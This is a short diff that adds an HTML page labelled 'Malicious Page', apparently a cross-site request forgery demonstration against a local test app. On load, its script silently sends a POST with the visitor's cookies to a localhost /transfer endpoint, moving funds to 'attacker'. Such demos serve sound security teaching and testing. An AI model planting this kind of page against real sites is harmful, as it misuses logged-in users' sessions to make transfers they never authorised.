@@ -1,0 +1,19 @@
+<!-- malicious-page/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Malicious Page</title>
+</head>
+<body>
+<script>
+  fetch('http://localhost:3001/transfer', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ amount: 100, to: 'attacker' }),
+    credentials: 'include',  // Assume user is logged in
+  });
+</script>
+</body>
+</html>
